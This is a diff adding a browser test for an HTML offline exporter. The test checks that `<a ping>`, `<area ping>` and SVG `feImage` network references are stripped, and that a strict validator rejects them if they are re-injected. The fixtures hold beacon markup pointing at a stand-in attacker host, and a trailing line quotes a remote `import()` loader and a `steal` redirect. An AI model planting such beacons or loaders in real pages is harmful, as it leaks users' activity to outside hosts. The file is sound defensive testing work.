@@ -2625,6 +2625,204 @@ test("CMH-OFFLINE-04: an injected base href cannot rebase the relative reference
   }
 });
 
+// Two more egress shapes that were in neither the offline strip nor the strict validator (#992):
+// hyperlink auditing (`<a ping>` / `<area ping>`, which POSTs to every URL it names on every
+// click) and the SVG filter primitive `feImage`, which fetches exactly like the `<image>` and
+// `<use>` the media list already covered. The controls sit beside them: a RELATIVE and a `data:`
+// feImage reference must survive untouched, and every element must keep its identity - only the
+// egress goes.
+const PING_FEIMAGE_CONTENT = [
+  "<h1>Hyperlink auditing and filter primitives</h1>",
+  '<p id="ping-note">A ping attribute POSTs to every URL it names on every click.</p>',
+  '<a id="cmh-ping-link" href="#ping-note" ping="https://evil.example/audit https://evil.example/audit-2">audited link</a>',
+  // A RELATIVE ping is removed too: it still POSTs, it shows the reader nothing, and the gate
+  // rejects one for exactly that reason, so keeping it would be the drift this closes.
+  '<a id="cmh-ping-relative" href="#ping-note" ping="audit.php">locally audited link</a>',
+  // A value made only of ASCII whitespace names no URL, so a browser sends nothing and BOTH sides
+  // must leave the bytes exactly as the author wrote them - the control for the tokenization rule.
+  '<a id="cmh-ping-blank" href="#ping-note" ping=" ">unaudited link</a>',
+  '<map name="cmh-map"><area id="cmh-ping-area" shape="rect" coords="0,0,1,1" href="#ping-note" ping="https://evil.example/area-audit" alt="audited area"></map>',
+  // A template-parked one starts auditing the moment a script adopts the fragment, which is why
+  // every load pass walks into templates.
+  '<template id="cmh-ping-template"><a id="cmh-ping-parked" href="#ping-note" ping="https://evil.example/parked-audit">parked</a></template>',
+  '<svg id="cmh-fe-svg" width="8" height="8">',
+  // SVG 2 gives its own anchor a `ping` too, and the tag-name selector matches it in either
+  // namespace - as does the validator's flat tokenizer, which only ever sees the name `a`.
+  '<a id="cmh-ping-svg" href="#ping-note" ping="https://evil.example/svg-audit"><rect width="2" height="2"></rect></a>',
+  '<filter id="cmh-fe-net"><feImage id="cmh-fe-href" href="https://evil.example/fe.png"></feImage></filter>',
+  '<filter id="cmh-fe-net-legacy"><feImage id="cmh-fe-xlink" xlink:href="https://evil.example/fe-legacy.png"></feImage></filter>',
+  '<filter id="cmh-fe-keep"><feImage id="cmh-fe-relative" href="local-tile.png"></feImage></filter>',
+  '<filter id="cmh-fe-keep-data"><feImage id="cmh-fe-data" xlink:href="data:image/gif;base64,R0lGODlhAQABAAAAACw="></feImage></filter>',
+  '<rect width="8" height="8" filter="url(#cmh-fe-net)"></rect>',
+  "</svg>",
+  '<template id="cmh-fe-template"><svg><filter id="cmh-fe-parked-filter"><feImage id="cmh-fe-parked" href="https://evil.example/parked-fe.png"></feImage></filter></svg></template>',
+  // Authored OUTSIDE any <svg>, so the HTML parser leaves it in the HTML namespace. It fetches
+  // nothing there, but the validator's tokenizer cannot tell the two apart, so the strip must clear
+  // it too or the gate would reject a file the exporter had just produced. This is what makes the
+  // single `feImage` selector spelling - case-sensitive for SVG, case-insensitive for HTML - the
+  // whole mechanism rather than an incidental detail.
+  '<feimage id="cmh-fe-html-ns" href="https://evil.example/html-ns-fe.png"></feimage>',
+].join("\n");
+
+// The attribute value carried by the element with `id`, or undefined when it carries none. Read off
+// the SERIALIZED export rather than a DOM, because what ships is the text.
+function attrOfId(html, id, attr) {
+  const tag = (html.match(new RegExp(`<[a-zA-Z][^>]*\\sid="${id}"[^>]*>`)) || [])[0];
+  if (!tag) return null;
+  const m = tag.match(new RegExp(`\\s${escapeRegExp(attr)}\\s*=\\s*"([^"]*)"`, "i"));
+  return m ? m[1] : undefined;
+}
+
+test("CMH-OFFLINE-04: hyperlink auditing and an SVG feImage are stripped from an offline export", async ({ page, browser }) => {
+  test.setTimeout(90000);
+  const staged = stageContent(PING_FEIMAGE_CONTENT, { key: "cmh-offline-ping-feimage", source: "offline-ping-feimage.html" });
+  const outDir = makeTmpDir();
+  let ctx2;
+  try {
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    // The shapes are live on the SOURCE document, so the assertions below are about a strip that
+    // ran rather than about markup a parser silently dropped.
+    expect(await page.evaluate(() => document.getElementById("cmh-ping-link").ping))
+      .toContain("evil.example");
+    expect(await page.evaluate(() => document.getElementById("cmh-fe-href").getAttribute("href")))
+      .toContain("evil.example");
+    // The one spelling that reaches BOTH namespaces, which is the whole mechanism the strip relies
+    // on: four SVG-namespaced primitives (matched case-sensitively) plus the one authored outside
+    // `<svg>` in the HTML namespace (matched case-insensitively).
+    expect(await page.evaluate(() => document.querySelectorAll("feImage").length)).toBe(5);
+    expect(await page.evaluate(() =>
+      document.getElementById("cmh-fe-html-ns").namespaceURI)).toBe("http://www.w3.org/1999/xhtml");
+    expect(await page.evaluate(() =>
+      document.getElementById("cmh-fe-href").namespaceURI)).toBe("http://www.w3.org/2000/svg");
+
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    expect(exportedHtml, "no auditing or filter beacon may survive").not.toContain("evil.example");
+    // Neutralized, not deleted: the links, the area and the filter primitives are content.
+    for (const id of ["cmh-ping-link", "cmh-ping-relative", "cmh-ping-blank", "cmh-ping-area",
+      "cmh-ping-parked", "cmh-ping-svg", "cmh-fe-href", "cmh-fe-xlink", "cmh-fe-relative",
+      "cmh-fe-data", "cmh-fe-parked", "cmh-fe-html-ns"]) {
+      expect(exportedHtml, `${id} must be kept as an element`).toContain(`id="${id}"`);
+    }
+    for (const id of ["cmh-ping-link", "cmh-ping-relative", "cmh-ping-area", "cmh-ping-parked",
+      "cmh-ping-svg"]) {
+      expect(attrOfId(exportedHtml, id, "ping"), `${id} must keep no ping attribute`).toBeUndefined();
+    }
+    // ...and the value that names no URL is left exactly as authored, on both sides.
+    expect(attrOfId(exportedHtml, "cmh-ping-blank", "ping")).toBe(" ");
+    expect(attrOfId(exportedHtml, "cmh-ping-link", "href")).toBe("#ping-note");
+    expect(attrOfId(exportedHtml, "cmh-fe-href", "href")).toBeUndefined();
+    expect(attrOfId(exportedHtml, "cmh-fe-xlink", "xlink:href")).toBeUndefined();
+    expect(attrOfId(exportedHtml, "cmh-fe-parked", "href")).toBeUndefined();
+    expect(attrOfId(exportedHtml, "cmh-fe-html-ns", "href")).toBeUndefined();
+    // ...and no further: the local references are the control, and they must be untouched.
+    expect(attrOfId(exportedHtml, "cmh-fe-relative", "href")).toBe("local-tile.png");
+    expect(attrOfId(exportedHtml, "cmh-fe-data", "xlink:href")).toBe("data:image/gif;base64,R0lGODlhAQABAAAAACw=");
+    expect(networkLoadRefs(exportedHtml)).toEqual([]);
+
+    const exportedPath = path.join(outDir, "offline-ping-feimage.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+    // The gate must agree with the strip: a file the exporter cleans is offline-clean to --strict.
+    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
+    // ...and the other direction, which the clean file alone cannot prove: re-inject each shape
+    // into the EXPORTED file and the gate must reject it, so a hand-authored offline document
+    // cannot keep what the strip takes away.
+    const reinjections = [
+      ['<a id="cmh-ping-reinjected" href="#ping-note" ping="https://evil.example/audit">x</a>',
+        /<a ping="https:\/\/evil\.example\/audit">/, "POSTs to a network URL"],
+      // A RELATIVE ping is rejected too, on the meta-refresh reasoning: the export removes it
+      // whatever it names, so accepting one would bless a file an export would change.
+      ['<a id="cmh-ping-reinjected" href="#ping-note" ping="audit.php">x</a>',
+        /<a ping="audit\.php">/, "audits every click"],
+      ['<svg><filter id="cmh-fe-reinjected"><feImage href="https://evil.example/fe.png"></feImage></filter></svg>',
+        /<feimage href="https:\/\/evil\.example\/fe\.png">/, "loads over the network"],
+      // An NBSP ping is the boundary case: a browser tokenizes the list on ASCII whitespace ONLY,
+      // so this names a real relative target and POSTs to it, while a `.strip()`-based gate would
+      // have called the value empty and blessed the file.
+      ['<a id="cmh-ping-reinjected" href="#ping-note" ping="\u00a0">x</a>',
+        /<a ping="[^"]*"> audits every click/, "audits every click"],
+    ];
+    for (const [markup, labelRe, needle] of reinjections) {
+      const reinjectedPath = path.join(outDir, "offline-ping-feimage-reinjected.html");
+      const reinjectedHtml = exportedHtml.replace('<p id="ping-note"', markup + '\n<p id="ping-note"');
+      expect(reinjectedHtml, "the shape must actually have been re-injected").not.toEqual(exportedHtml);
+      fs.writeFileSync(reinjectedPath, reinjectedHtml);
+      // Pinned to the rule under test, not merely to a non-zero exit: an exit-code-only assertion
+      // would be satisfied by any future rule that rejected this file for an unrelated reason.
+      let failure = null;
+      try {
+        execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", reinjectedPath], { cwd: SKILL, stdio: "pipe" });
+      } catch (err) {
+        failure = String(err.stdout || "") + String(err.stderr || "");
+      }
+      expect(failure, `--strict must reject ${markup}`).not.toBeNull();
+      expect(failure).toMatch(labelRe);
+      expect(failure).toContain(needle);
+    }
+
+    // The strip is the layer that must not DEPEND on the CSP - and hyperlink auditing is the shape
+    // where that matters most, since CSP Level 3 folds it into `connect-src` and a current browser
+    // most likely absorbs it. So re-open the export with its zero-network policy REMOVED, adopt
+    // every parked fragment, click the audited link, and require that nothing leaves the machine.
+    const noCspPath = path.join(outDir, "offline-ping-feimage-no-csp.html");
+    const cspMetaRe = /<meta\b[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/gi;
+    expect((exportedHtml.match(cspMetaRe) || []).length, "the export must carry a CSP meta").toBeGreaterThan(0);
+    const noCspHtml = exportedHtml.replace(cspMetaRe, "");
+    expect(noCspHtml.match(cspMetaRe), "every CSP meta must actually have been removed").toBeNull();
+    fs.writeFileSync(noCspPath, noCspHtml);
+    ctx2 = await browser.newContext();
+    const page2 = await ctx2.newPage();
+    const external = [];
+    await page2.route(/^https?:\/\//, async (route) => {
+      external.push(route.request().url());
+      await route.abort();
+    });
+    await page2.goto(fileUrl(noCspPath));
+    await ready(page2);
+    await page2.evaluate(() => {
+      document.querySelectorAll("template").forEach((t) => {
+        document.body.appendChild(document.importNode(t.content, true));
+      });
+    });
+    expect(await page2.evaluate(() => document.getElementById("cmh-ping-link").ping)).toBe("");
+    expect(await page2.evaluate(() =>
+      [...document.querySelectorAll("feImage")].map((el) =>
+        (el.getAttribute("href") || "") + " " + (el.getAttribute("xlink:href") || "")).join(" ")))
+      .not.toContain("evil.example");
+    await page2.evaluate(() => document.getElementById("cmh-ping-link").click());
+    // A bare "no request arrived" is a timing artifact unless the harness is PROVEN to observe one,
+    // so inject a fresh ping link and click it: waiting for ITS beacon is both the positive control
+    // and a deterministic barrier - the stripped link's POST, dispatched first, would have been
+    // seen by the time this one arrives.
+    const controlUrl = "https://ping-control.example/beacon";
+    const controlRequest = page2.waitForRequest(controlUrl);
+    await page2.evaluate((url) => {
+      const probe = document.createElement("a");
+      probe.id = "cmh-ping-control";
+      probe.href = "#ping-note";
+      probe.setAttribute("ping", url);
+      document.body.appendChild(probe);
+      probe.click();
+    }, controlUrl);
+    expect((await controlRequest).method(), "the harness must really observe a ping beacon").toBe("POST");
+    // Polled, not read once: `waitForRequest` resolves on the REQUEST event, while `external` is
+    // appended by the route handler that runs just after it.
+    await expect.poll(() => external, { timeout: 10000 }).toEqual([controlUrl]);
+  } finally {
+    if (ctx2) await ctx2.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+});
+
 const QUOTED_EGRESS_NOTE = 'Please drop the import("https://evil.example/x.js") loader and the '
   + 'location.href = "https://evil.example/steal" beacon before we ship this.';
 
